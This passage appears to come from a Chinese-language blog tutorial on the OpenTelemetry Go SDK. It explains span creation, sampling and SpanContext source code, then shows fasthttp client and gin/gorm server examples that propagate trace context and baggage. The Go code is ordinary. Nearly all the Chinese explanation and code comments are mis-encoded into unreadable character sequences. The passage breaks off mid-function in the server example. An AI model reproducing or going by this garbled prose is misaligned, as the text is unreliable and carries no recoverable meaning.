    <span class="hljs-comment">// è¿™é‡Œå¦‚æœå¤§å®¶çœ‹è¿‡æˆ‘ä¹‹å‰æ–‡ç« æˆ–è€… context æºç ï¼Œå¤§å®¶ä¼šæ¸…æ¥šçš„çŸ¥é“ è¿™å°±æ˜¯é€’å½’çš„å»æ‰¾æœ‰æ²¡æœ‰è¿™ä¸ª keyï¼Œvalue</span>
    <span class="hljs-comment">// ä»è‡ªå·±å¼€å§‹ä¸€ç›´æ‰¾åˆ°æœ€å¼€å§‹çš„æ ¹ï¼Œè¿™é‡Œå¦‚æœæ‰¾åˆ°äº†è¯´æ˜é“¾è·¯çš„å¤´å·²ç»è¢«åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯å·²ç»å­˜åœ¨ TracerIDï¼Œè¦å¤ç”¨è¿™ä¸ª è¦ä¸æ–­é“¾</span>
	<span class="hljs-keyword">if</span> span, ok := ctx.Value(currentSpanKey).(Span); ok {
		<span class="hljs-keyword">return</span> span
	}
    <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯æ²¡æ‰¾åˆ° ç¬¦åˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡ start</span>
	<span class="hljs-keyword">return</span> noopSpanInstance
}
</code></pre>
<h3 data-id="heading-7"><code>tr.newSpan(ctx, name, &amp;config)</code> å‡½æ•°</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> newSpan(ctx context.Context, name <span class="hljs-type">string</span>, config *trace.SpanConfig) trace.Span {
    
	<span class="hljs-keyword">var</span> psc trace.SpanContext
    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦é€‰æ‹©æ–­é“¾  æ­£å¸¸æƒ…å†µéƒ½ä¸æ–­ï¼Œé»˜è®¤ä¹Ÿæ˜¯ä¸æ–­  æœ‰äº›æƒ…å†µ æ¯”å¦‚ æ¶ˆæ¯è¡¥å¿	ä¸ä¿¡ä»»ä¸Šæ¸¸ å¯ä»¥è®¾ç½®</span>
	<span class="hljs-keyword">if</span> config.NewRoot() {
		ctx = trace.ContextWithSpanContext(ctx, psc)
	} <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¤§éƒ¨åˆ†èµ°è¿™ä¸€æ­¥  åç»­æœ‰ä»£ç </span>
		psc = trace.SpanContextFromContext(ctx)
	}


	<span class="hljs-keyword">var</span> tid trace.TraceID
	<span class="hljs-keyword">var</span> sid trace.SpanID
    <span class="hljs-comment">// æ‹¿åˆ°ä¹‹å åˆ¤æ–­ä¸€ä¸‹ TraceIDæœ‰ä¹ˆ å…¶å®å°±æ˜¯ ä¸Šä¸€æ­¥è¿”å›ç©ºè¯´æ˜æ²¡æœ‰æ ¹Spanï¼Œå°±ç”Ÿæˆ TraceID å’Œ SpanID å¦‚æœæœ‰äº†æ ¹ èµ°else</span>
    <span class="hljs-comment">// è¿™é‡Œçš„ç”Ÿæˆå™¨åœ¨ä¹‹å‰çš„æºç è®²è§£ä¸­ï¼Œåˆå§‹åŒ–è¿‡ï¼Œä¹Ÿå¯ä»¥è‡ªå·±ä¼ ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨é»˜è®¤</span>
	<span class="hljs-keyword">if</span> !psc.TraceID().IsValid() {
        <span class="hljs-comment">// ç”Ÿæˆ TraceID å’Œ SpanID</span>
		tid, sid = tr.provider.idGenerator.NewIDs(ctx)
	} <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è¿™é‡Œ å¤ç”¨ æ ¹çš„ TraceID ç¡®ä¿ä¸æ–­é“¾ ç”Ÿæˆè‡ªå·±çš„ SpanID</span>
		tid = psc.TraceID()
		sid = tr.provider.idGenerator.NewSpanID(ctx, tid)
	}
	
    <span class="hljs-comment">// è¿™æ˜¯é‡‡æ ·å†³ç­–ç›¸å…³çš„ </span>
	samplingResult := tr.provider.sampler.ShouldSample(SamplingParameters{
		ParentContext: ctx,
		TraceID:       tid,
		Name:          name,
		Kind:          config.SpanKind(),  		 <span class="hljs-comment">//ä¸­é—´ä»¶ç›¸å…³</span>
		Attributes:    config.Attributes(),		<span class="hljs-comment">//ä¸­é—´ä»¶ç›¸å…³</span>
		Links:         config.Links(),		<span class="hljs-comment">//ä¸­é—´ä»¶ç›¸å…³</span>
	})
	
    <span class="hljs-comment">// é‡è¦ï¼ï¼ï¼ æ„é€  SpanContext çš„é…ç½® ç¬¬ä¸€æ¬¡çš„è¯ è‚¯å®šè¦è®©ä¸‹ä¸€ä¸ªçŸ¥é“è¿™ä¸ªæ˜¯æ ¹ é˜²æ­¢æ–­é“¾</span>
	scc := trace.SpanContextConfig{
		TraceID:    tid,
		SpanID:     sid,
		TraceState: samplingResult.Tracestate, 
	}
    
    <span class="hljs-comment">// ä¹‹å‰èŠ±äº†æ—¶é—´åœ¨å¦‚ä½•é‡‡æ ·ä¸Š è¿™é‡Œå°±æ˜¯ç”¨è®²è¿‡çš„ç®—æ³•åˆ¤æ–­æ˜¯å¦é‡‡æ ·</span>
	<span class="hljs-keyword">if</span> isSampled(samplingResult) {
		scc.TraceFlags = psc.TraceFlags() | trace.FlagsSampled
	} <span class="hljs-keyword">else</span> {
		scc.TraceFlags = psc.TraceFlags() &amp;^ trace.FlagsSampled
	}
    <span class="hljs-comment">// è¿™é‡Œæ˜¯é€šè¿‡ä¸Šé¢çš„é…ç½®ç”Ÿæˆ SpanContext é‡ç‚¹æ˜¯åœ¨ return çš„å‡½æ•°å»ç”Ÿæˆ spanï¼ˆæ¥å£ï¼‰ ç»“æ„ä½“æ˜¯ï¼šRecordingSpan</span>
    <span class="hljs-comment">// è¿™ä¸ªRecordingSpan é‡Œé¢æœ‰å­—æ®µ SpanContext é‡ç‚¹ å°±æ˜¯ä»è¿™åˆ›å»ºçš„ ä»¥åæ‹¿çš„æ—¶å€™ä¸å†æ˜¯ç©º è€Œæ˜¯æœ‰ä¸œè¥¿çš„</span>
	sc := trace.NewSpanContext(scc)
	
    <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯ä¸é‡‡æ · é‚£å°±èµ°è¿™ä¸ª return å› ä¸ºéƒ½ä¸é€‰æ‹©é‡‡æ ·äº† å°±è¿”å›ä¸€ä¸ª è½»é‡çº§çš„ Span åªæœ‰ traceID å’Œ SpanID å°±å¯ä»¥</span>
    <span class="hljs-comment">// èŠ‚çœç©ºé—´ å‡ ä¹é›¶å¼€é”€ï¼Œåœ¨é«˜å¹¶å‘çš„åœºæ™¯ å¤§éƒ¨åˆ†éƒ½æ˜¯10%çš„é‡‡æ · å¦‚æœæ²¡æœ‰è½»é‡çº§è®°å½• å†…å­˜ä¼šè¢«å‹å®</span>
	<span class="hljs-keyword">if</span> !isRecording(samplingResult) {
		<span class="hljs-keyword">return</span> tr.newNonRecordingSpan(sc)
	}
    <span class="hljs-comment">// é¡¾åæ€ä¹‰ åˆ›å»ºä¸€ä¸ªæ´»ç€çš„æˆ–è€…è¯´å¯ä»¥è®°å½•çš„ Span   å¯ä»¥å­˜å‚¨äº‹ä»¶ï¼Œæœ‰ç€å„ç§å±æ€§</span>
	<span class="hljs-keyword">return</span> tr.newRecordingSpan(ctx, psc, sc, name, samplingResult, config)
}
</code></pre>
<h3 data-id="heading-8"><code>trace.SpanContextFromContext(ctx)</code> å‡½æ•°</h3>
<p>å†…éƒ¨å°±æ˜¯<code>SpanFromContext(ctx).SpanContext()</code> è°ƒç”¨äº†ä¸Šé¢è®²è¿‡çš„å‡½æ•°ï¼Œæ‹¿åˆ°ä¹‹åç”¨åˆ°å®ƒçš„ <code>SpanContext</code>  å­—æ®µ</p>
<p>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ä¹Ÿå°±æ˜¯è¿”å› <code>noopSpanInstance</code>æ‹¿åˆ°çš„  <code>SpanContext</code>   ä¹Ÿæ˜¯ç©ºç»“æ„ä½“</p>
<p>è¿™é‡Œä¸»è¦è®²ä¸€ä¸‹ç¬¬äºŒæ¬¡ä¹Ÿå°±æ˜¯ <code>funcA(gctx)</code>å‡½æ•°ä¸­ è°ƒç”¨åï¼Œ<code>main</code> å‡½æ•°å·²ç»åˆ›å»ºå¥½ä¸» <code>Span</code> é‚£å®ƒæ‰§è¡Œè¿™ä¸ªæ˜¯æ€ä¹ˆæ ·çš„</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SpanContextFromContext</span><span class="hljs-params">(ctx context.Context)</span></span> SpanContext {
    <span class="hljs-comment">// è¿™é‡Œç»“åˆä¸Šé¢ å¯¹ trace.NewSpanContext(scc) çš„æ³¨é‡Š å†æ¥çœ‹è¿™ä¸ªä»£ç  å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ é‚£å°±æ˜¯ç©ºæ²¡å•¥æ„ä¹‰</span>
    <span class="hljs-comment">// ç¬¬äºŒæ¬¡çš„è¯ å°±èƒ½æ‹¿åˆ°è¿™ä¸ª span ä¹Ÿå°±æ˜¯ SpanFromContext(ctx) è¿”å›çš„ è¿™ä¸ªspan çœŸå®æ˜¯ RecordingSpan</span>
    <span class="hljs-comment">// RecordingSpan ä»–çš„ä¸€ä¸ªæ–¹æ³• SpanContext() å°±æ˜¯ç›´æ¥è¿”å› ä»–çš„å­—æ®µ RecordingSpan.SpanContext å°±æ˜¯ä¸Šé¢åˆ›å»ºçš„</span>
	<span class="hljs-keyword">return</span> SpanFromContext(ctx).SpanContext()
}

<span class="hljs-comment">// è¿”å›çš„å­—æ®µ åœ¨ trace.NewSpanContext(scc) å‡½æ•° ä¸­å¯ä»¥çœ‹åˆ°</span>
</code></pre>
<h3 data-id="heading-9"><code>trace.NewSpanContext(scc)</code> å‡½æ•°</h3>
<p>ä¸»è¦äº†è§£ä¸€ä¸‹å®ƒçš„å­—æ®µï¼ŒTODO</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewSpanContext</span><span class="hljs-params">(config SpanContextConfig)</span></span> SpanContext {
	<span class="hljs-keyword">return</span> SpanContext{
		traceID:    config.TraceID,    <span class="hljs-comment">// æ•´æ¡è°ƒç”¨é“¾çš„å”¯ä¸€ IDï¼ˆä¸€æ¡ trace åªæœ‰ä¸€ä¸ªï¼‰</span>
		spanID:     config.SpanID,     <span class="hljs-comment">// å½“å‰è¿™ä¸ª span è‡ªå·±çš„ IDï¼ˆæ¯ä¸ª span éƒ½ä¸ä¸€æ ·ï¼‰</span>
		traceFlags: config.TraceFlags, <span class="hljs-comment">// ä¸€äº›â€œçŠ¶æ€ä½â€ï¼Œæœ€é‡è¦çš„æ˜¯ï¼šé‡‡ä¸é‡‡æ ·</span>
		traceState: config.TraceState, <span class="hljs-comment">// è·¨å‚å•†é€ä¼ çš„é¢å¤–ä¿¡æ¯</span>
        <span class="hljs-comment">// è¿™ä¸ª span æ˜¯ä¸æ˜¯ä»â€œè¿œç«¯â€æ¥çš„ å¦‚æœæ˜¯ RPCé€šè®¯ å¹¶ä¸æ˜¯åœ¨æˆ‘è¿™ä¸ªä¸»æœºä¸Šåˆ›å»ºçš„ï¼Œé‚£å°±ä¸º True</span>
        <span class="hljs-comment">// å¦‚æœæ˜¯æœ¬æœºåˆ›å»ºçš„ï¼Œæˆ‘ä»¬åŸºç¡€çš„ä¾‹å­ï¼Œéƒ½æ˜¯æˆ‘ä»¬è¿™ä¸ªè¿›ç¨‹è‡ªå·±åˆ›å»ºçš„ï¼Œå¹¶æ²¡æœ‰è·¨ä¸»æœºè¿›è¡Œé€šè®¯ é‚£å°±ä¸º False</span>
        <span class="hljs-comment">// å½“ä¸Šæ¸¸ Http åˆ›å»º Span è¯·æ±‚æˆ‘ä»¬çš„åç«¯ æˆ‘ä»¬åç«¯æ‹¿åˆ°çš„å°±æ˜¯ è¿œç¨‹çš„ Span</span>
		remote:     config.Remote,     
	}
}
</code></pre>
<h3 data-id="heading-10"><code>tr.newRecordingSpan(ctx, psc, sc, name, samplingResult, config)</code> å‡½æ•°</h3>
<p>è¿™é‡Œä¸»è¦æ˜¯åˆ›å»ºå¯è®°å½•çš„ <code>Span</code> è¿™è¾¹è¿”å›åï¼Œå°±å›åˆ°äº†ä¸»é€»è¾‘ <code>tr.Start()</code> å‡½æ•°ï¼Œè¿”å›é˜…è¯»</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> newRecordingSpan(ctx context.Context, psc, sc trace.SpanContext, name <span class="hljs-type">string</span>,
	sr SamplingResult,
	config *trace.SpanConfig,
) *recordingSpan {  <span class="hljs-comment">// è¿”å›ç±»å‹   *recordingSpan</span>
    <span class="hljs-comment">// å¯ä»¥ä¼ é€’æ—¶é—´ è¿™æ ·ä¹Ÿå¯ä»¥æŠŠæ—¶é—´ç®—è¿›æ¥</span>
	startTime := config.Timestamp()
	<span class="hljs-keyword">if</span> startTime.IsZero() {
		startTime = time.Now()
	}
	<span class="hljs-comment">// è¦è¿”å›çš„ NewSpan</span>
	s := &amp;recordingSpan{
		parent:      psc,   <span class="hljs-comment">// çˆ¶ span</span>
		spanContext: sc,   <span class="hljs-comment">// å½“å‰ Span</span>
		spanKind:    trace.ValidateSpanKind(config.SpanKind()),  <span class="hljs-comment">// ä¸­é—´ä»¶å¯èƒ½ç”¨åˆ°</span>
		name:        name,   <span class="hljs-comment">// span åå­—  æ¯”å¦‚ main funA è‡ªå·±ä¼ çš„</span>
		startTime:   startTime,
        <span class="hljs-comment">// è¿™ä¸ªå¾ˆæœ‰ç”¨ è‡ªå·±åœ¨ä¸šåŠ¡ä¸­å­˜ä¸€äº› äº‹ä»¶ åç»­è¿›é˜¶ä¾‹å­æˆ‘ä»¬ä¼šç”¨åˆ°ï¼Œè®°ä½åœ¨è¿™å­˜å‚¨äº†å°±å¥½ </span>
        <span class="hljs-comment">// è€Œä¸”ä¸ºäº†é˜²æ­¢æœ‰äººæ¶æ„å­˜ä¸Šåƒä¸ªï¼Œè¿™é‡Œæœ‰é™åˆ¶ï¼Œé»˜è®¤æœ€å¤š 128 ä¸ª åœ¨åˆå§‹åŒ– tp çš„æ—¶å€™è®¾ç½®çš„</span>
		events:      newEvictedQueueEvent(tr.provider.spanLimits.EventCountLimit), 
        <span class="hljs-comment">// // ä¸­é—´ä»¶å¯èƒ½ç”¨åˆ°</span>
		links:       newEvictedQueueLink(tr.provider.spanLimits.LinkCountLimit),
        <span class="hljs-comment">// åå‘ä¿å­˜ tracerï¼Œåé¢ End() è¦ç”¨</span>
		tracer:      tr,
	}
	<span class="hljs-comment">// äº†è§£</span>
	<span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> config.Links() {
		s.AddLink(l)
	}
	<span class="hljs-comment">// è¿™é‡Œæ˜¯ç¬¬ä¸‰æ–¹çš„ ä¸€äº› key value å¯¹</span>
	s.SetAttributes(sr.Attributes...)
    <span class="hljs-comment">// è¿™é‡Œæ˜¯æ·»åŠ ç”¨æˆ·æˆ–è€…ä¸­é—´ä»¶ä¼ æ¥çš„ ä¸€äº› key value å¯¹ ï¼ˆåç»­è¿›é˜¶ä¾‹å­ä¹Ÿä¼šç”¨åˆ°ï¼‰</span>
	s.SetAttributes(config.Attributes()...)
	
    <span class="hljs-comment">// è¿™ä¸ªæ˜¯ å¯è§‚æµ‹æ€§å¼€å…³ é»˜è®¤ä¸å¼€å¯ è¿™ä¸ªé€»è¾‘ä¸èµ° ç›´æ¥ return</span>
	<span class="hljs-keyword">if</span> tr.inst.Enabled() {
		ctx = trace.ContextWithSpan(ctx, s)
		tr.inst.SpanLive(ctx, s)
	}

	<span class="hljs-keyword">return</span> s
}
</code></pre>
<h2 data-id="heading-11">è·¨æœåŠ¡å…¨é“¾è·¯æ•´åˆï¼ˆ<code>Gin</code> / <code>Gorm</code> / <code>Fasthttp</code> ç”Ÿæ€å¯¹æ¥ï¼‰</h2>
<h3 data-id="heading-12">å®¢æˆ·ç«¯éƒ¨åˆ†</h3>
<p>æ–¹ä¾¿æµ‹è¯•è¿™é‡Œä½¿ç”¨ <code>fasthttp</code>åªæ˜¯ä¸ºäº†æ¨¡æ‹Ÿè·¨æœåŠ¡æˆ–è€…è·¨ç½‘æ®µçš„é“¾è·¯è¿½è¸ªï¼Œç”±äºæˆ‘ä»¬å­¦åˆ°äº†åˆå§‹åŒ–çš„æºç å’Œé“¾è·¯è¿½è¸ªçš„æºç ï¼Œè¿™æ—¶å€™å†çœ‹ä¸€äº›ä¸­é—´ä»¶æˆ–è€…å¤§å‹é¡¹ç›®çš„é“¾è·¯è¿½è¸ªæºç ï¼Œå°±æ˜ç™½æ˜¯å¦‚ä½•è¿æ¥èµ·æ¥äº†</p>
<p>é‡ç‚¹ä»‹ç»äº†æˆ‘ä»¬æ³¨å†Œçš„ <code>Propagator</code> ï¼ˆä¼ æ’­å™¨ï¼‰ï¼Œæœ€é‡è¦çš„ <code>Inject</code> å’Œ <code>Extract</code> æ–¹æ³•ï¼Œè¿™æ˜¯è·¨æœåŠ¡è¿›è¡Œé“¾è·¯è¿½è¸ªå’Œæ ¸å¿ƒ</p>
<p>å¹¶ä½¿ç”¨äº† <code>baggage</code> ä¼ æ’­æˆ‘ä»¬è‡ªå·±æƒ³ä¼ çš„é€»è¾‘ï¼Œè¡¥å……ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ³¨å†Œçš„æ˜¯ï¼š
<code>SetTextMapPropagator(propagation.NewCompositeTextMapPropagator(propagation.TraceContext{}, propagation.Baggage{}))</code></p>
<p>ç¬¬ä¸€ä¸ªä¸»è¦å°±æ˜¯ä¼ é€ <code>TraceID</code> å’Œ <code>SpanID</code>  ï¼Œä¸€èˆ¬ä¸ä¼šç”¨å®ƒä¼ é€’å…¶ä»–çš„ï¼Œé˜²æ­¢æ±¡æŸ“</p>
<p>åœ¨ <code>Inject</code>  çš„æ—¶å€™ å®ƒæ˜¯å¯ä»¥æ”¯æŒ <code>p.Inject(Newctx, propagation.MapCarrier(headers))</code> è¿™ä¸ª  <code>headers</code> å‰ææ˜¯ <code>http.headers</code></p>
<p>ä½†ç”±äºæˆ‘ä»¬ç”¨çš„æ˜¯<code>fasthttp</code> æ‰€ä»¥æˆ‘ä»¬éœ€è¦è½¬æ¢ä¸€ä¸‹ï¼Œè¿™é‡Œå‘Šè¯‰å¤§å®¶ï¼Œå¦‚æœæ˜¯æ­£å¸¸å†™é¡¹ç›®ï¼Œç›´æ¥æ”¾å…¥å³å¯</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/baggage"</span>
	<span class="hljs-string">"golang.org/x/sync/errgroup"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"github.com/valyala/fasthttp"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/attribute"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/propagation"</span>
)

<span class="hljs-comment">// è¿™é‡Œ ç®€å•åç¨‹ è¯æ˜ é“¾è·¯ funcC å’Œ funcD é“¾è·¯æ˜¯åŒçº§</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcC</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-C"</span>)
	span.SetAttributes(attribute.String(<span class="hljs-string">"FuncCçš„æµ‹è¯•key"</span>, <span class="hljs-string">"å†…éƒ¨keyï¼Œä¸å¯ä¼ é€’"</span>))
	time.Sleep(time.Second)
	span.End()
}

<span class="hljs-comment">// é‡ç‚¹ è¿™é‡Œé¢ æ˜¯ ç”¨ fasthttp å‘é€è¯·æ±‚ æºå¸¦é“¾è·¯æ•°æ®ä»¥åŠè‡ªå·±æƒ³å‘çš„ä¸šåŠ¡æ•°æ®  æ¯”å¦‚ userid (å¯é€‰)</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcD</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// start æ‰æ˜¯çœŸæ­£ æ‹¿åˆ° TraceID æ‰¾åˆ°é“¾è·¯ æ‰€ä»¥å¿…é¡»ä¼  ctx ä¸æ‡‚å¯ä»¥å›å»çœ‹æºç </span>
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-D"</span>)
    <span class="hljs-comment">// è¿™é‡Œç»™å¤§å®¶å±•ç¤ºäº† å¦‚æœåˆ›å»º baggage æ•°æ® å¦‚ä½•å¡å…¥ å¦‚æœä½ æƒ³ä¼ çš„å¾ˆå¤šï¼Œæ¯”å¦‚æ˜¯ç»“æ„ä½“ </span>
    <span class="hljs-comment">// é‚£å®Œå…¨å¯ä»¥ json åºåˆ—åŒ–æˆ []byte ç„¶åæ”¾å…¥ åœ¨ä¸šåŠ¡ç«¯ åœ¨ååºåˆ—åŒ–</span>
	userID, _ := baggage.NewMember(<span class="hljs-string">"user.id"</span>, <span class="hljs-string">"10001"</span>)
	userRole, _ := baggage.NewMember(<span class="hljs-string">"user.role"</span>, <span class="hljs-string">"1"</span>)
    <span class="hljs-comment">// å¯ä»¥ä¸€ä¸‹ å¡å¤šä¸ª</span>
	bag, _ := baggage.New(userID, userRole)
    <span class="hljs-comment">// è¿™å°±æ˜¯ æ”¾å…¥ ctx å’Œ æˆ‘ä»¬ç”Ÿæˆçš„æ•°æ® è¿”å›ä¸€ä¸ªæ–°çš„ ctx è¿™ä¸ª ctx åŒ…å«ä¹‹å‰çš„ä¹Ÿæœ‰ç”Ÿæˆçš„æ•°æ®</span>
	Newctx := baggage.ContextWithBaggage(spanCtx, bag)
	time.Sleep(time.Second)
    <span class="hljs-comment">// æ–°å»ºè¯·æ±‚</span>
	req := fasthttp.AcquireRequest()
	<span class="hljs-keyword">defer</span> fasthttp.ReleaseRequest(req)  <span class="hljs-comment">//é˜²æ­¢æ³„éœ² å…³é—­</span>
	req.SetRequestURI(<span class="hljs-string">"http://127.0.0.1:8090/server"</span>)
	req.Header.SetMethod(<span class="hljs-string">"GET"</span>)
	<span class="hljs-comment">//é‡ç‚¹ è·å– æˆ‘ä»¬ä¼ å…¥çš„ Propagator</span>
	p := otel.GetTextMapPropagator()
    
	<span class="hljs-comment">// è¿™ä¸ªè¦æ³¨æ„ ï¼ï¼ï¼  ç”±äºç±»å‹ä¸åŒ¹é… åªèƒ½æ–°å»ºä¸€ä¸ª map ç„¶åæ³¨å…¥å€¼ä¹‹å å†æŠŠå€¼ç»™åˆ° req.Header</span>
	headers := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)
	p.Inject(Newctx, propagation.MapCarrier(headers))
	<span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> headers {
		req.Header.Set(key, value)
	}

	fclient := fasthttp.Client{}
	fres := fasthttp.Response{}
	<span class="hljs-comment">// éšè—é”™è¯¯</span>
	_ = fclient.Do(req, &amp;fres)

	span.End()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {

	tp, _ := common.InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,
		Endpoint: <span class="hljs-string">"http://192.168.163.132:14268/api/traces"</span>,
		Sampler:  <span class="hljs-number">1</span>,
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})

	ctx, cancel := context.WithCancel(context.Background())
    <span class="hljs-comment">// ä¸€æ ·éœ€è¦å…³é—­ ç„¶å tp å°±ä¼šæŠŠæ”’çš„é‚£äº› trace å‘é€å‡ºå»</span>
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context)</span></span> {
		ctx, cancel = context.WithTimeout(ctx, time.Second*<span class="hljs-number">5</span>)
		<span class="hljs-keyword">defer</span> cancel()
		<span class="hljs-keyword">if</span> err := tp.Shutdown(ctx); err != <span class="hljs-literal">nil</span> {
			<span class="hljs-built_in">panic</span>(err)
		}
	}(ctx)

	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// æ–°å»ºæ ¹ span</span>
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-main"</span>)

	gw, gctx := errgroup.WithContext(spanCtx)
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcC(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcD(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})

	_ = gw.Wait()
	span.End()
}

</code></pre>
<h3 data-id="heading-13">Server ç«¯éƒ¨åˆ†</h3>
<p>è¿™é‡Œç»™å¤§å®¶è®²è§£ <code>Server </code> ç«¯è¯»å–é“¾è·¯æ‹¿åˆ° <code>baggage</code> æ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨ <code>gin </code> å®˜æ–¹æ”¯æŒçš„ <code>Opentelemetry</code> ä¸­é—´ä»¶ è¿˜æœ‰ <code>grom</code> æ”¯æŒçš„</p>
<p>å¹¶é™„å¸¦éƒ¨åˆ†æºç ï¼Œå¦‚æœåœ¨æ¸…æ¥šä¸Šé¢è®²è¿‡çš„æºç åŸºç¡€ä¸Šï¼Œä¸‹é¢æºç ç†è§£èµ·æ¥éå¸¸ç®€å•</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"Advanced_Shop/test/telemetry/ch03/server/model"</span>
	<span class="hljs-string">"Advanced_Shop/test/telemetry/ch04/common"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/baggage"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/propagation"</span>

	<span class="hljs-string">"go.opentelemetry.io/otel/sdk/trace"</span>
	<span class="hljs-string">"gorm.io/driver/mysql"</span>
	<span class="hljs-string">"gorm.io/gorm"</span>
	<span class="hljs-string">"gorm.io/gorm/schema"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"go.opentelemetry.io/contrib/instrumentation/github.com/gin-gonic/gin/otelgin"</span>
	<span class="hljs-string">"gorm.io/plugin/opentelemetry/tracing"</span>
)
<span class="hljs-comment">// å¤§å®¶è¿™é‡Œåº”è¯¥æ˜ç™½ä¸€ä»¶äº‹æƒ…ï¼Œç”±äºmainå‡½æ•°åˆå§‹åŒ–çš„ï¼Œæƒ³è¦å…¶ä»–å‡½æ•°ä½¿ç”¨ï¼Œå¿…é¡»å®šä¹‰æˆå…¨å±€å˜é‡ï¼Œè€Œä¸”å¦‚æœä½ çš„è¯·æ±‚å¤„ç†åˆ†å¸ƒåœ¨ä¸åŒåŒ…ä¸­ï¼Œç›´æ¥ä½¿ç”¨å…¨å±€å˜é‡ä¼šå¢åŠ è€¦åˆåº¦ã€‚å¯¹äºä»–çš„å¹¶å‘å®‰å…¨ä½¿ç”¨ä¹Ÿæ˜¯éº»çƒ¦ï¼Œæ‰€ä»¥å¤§å®¶æœ€å¥½ä½¿ç”¨ option é€‰é¡¹æ¨¡å¼ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä¹‹å‰çš„æ–‡ç« </span>
<span class="hljs-keyword">var</span> tp *trace.TracerProvider

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Server</span><span class="hljs-params">(c *gin.Context)</span></span> {
	<span class="hljs-comment">// æ‹¿åˆ° context æ˜¯clientç«¯æ³¨å…¥ä¸œè¥¿çš„ Context</span>
	ctx := c.Request.Context()
	propagator := otel.GetTextMapPropagator()
	tr := tp.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// æå–å‡ºæ¥ å°±çŸ¥é“é“¾è·¯ TraceID å’Œ baggage æ•°æ® </span>
	sctx := propagator.Extract(ctx, propagation.HeaderCarrier(c.Request.Header))
    <span class="hljs-comment">// åˆ›å»ºå­é“¾è·¯</span>
	spanCtx, span := tr.Start(sctx, <span class="hljs-string">"server"</span>)
	<span class="hljs-keyword">defer</span> span.End()
    <span class="hljs-comment">//ä»ä¸­æ‹¿åˆ° baggage æ•°æ® å¹¶ æ‰“å°</span>
	bag := baggage.FromContext(sctx)
	userID := bag.Member(<span class="hljs-string">"user.id"</span>).Value()
	fmt.Println(userID)   <span class="hljs-comment">// 10001</span>
	
    <span class="hljs-comment">// è¿™é‡Œç»™å¤§å®¶ä»‹ç» gorm ä¸­çš„ é“¾è·¯è¿½è¸ª æ‰€ä»¥ è¿™é‡Œå»ºäº†ä¸€ä¸ªæ–°æ•°æ®åº“å’Œæ–°è¡¨ åªæ˜¯ç”¨äº åˆ°æ—¶çœ‹ç»“æœ</span>
	dsn := <span class="hljs-string">"root:root@tcp(127.0.0.1:3306)/user-srv?charset=utf8mb4&amp;parseTime=True&amp;loc=Local"</span>
	db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{
		NamingStrategy: schema.NamingStrategy{
			SingularTable: <span class="hljs-literal">true</span>,
		},
	})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
